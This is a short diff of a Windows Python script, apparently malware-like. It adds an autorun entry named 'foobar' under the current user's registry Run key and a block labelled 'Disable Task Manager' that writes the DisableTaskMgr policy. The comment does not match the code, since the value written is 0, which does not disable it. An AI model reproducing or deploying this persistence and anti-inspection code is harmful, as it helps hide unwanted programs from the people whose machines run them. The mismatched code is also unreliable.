@@ -62,7 +62,14 @@ else:
 	
 	# Registry key
 	PATH_TO_YOUR_EXECUTABLE = PATH
-	node = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, _winreg.KEY_ALL_ACCESS)
-	_winreg.SetValueEx(node, 'foobar', 0, _winreg.REG_SZ, PATH_TO_YOUR_EXECUTABLE)
 	
+	aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
+	aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE)
+	SetValueEx(aKey,"foobar",1, REG_SZ, PATH_TO_YOUR_EXECUTABLE)
+	CloseKey(aKey)
 	
+	# Disable Task Manager
+	aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
+	aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE)
+	SetValueEx(aKey,"DisableTaskMgr",1, REG_DWORD, 0)
+	CloseKey(aKey)
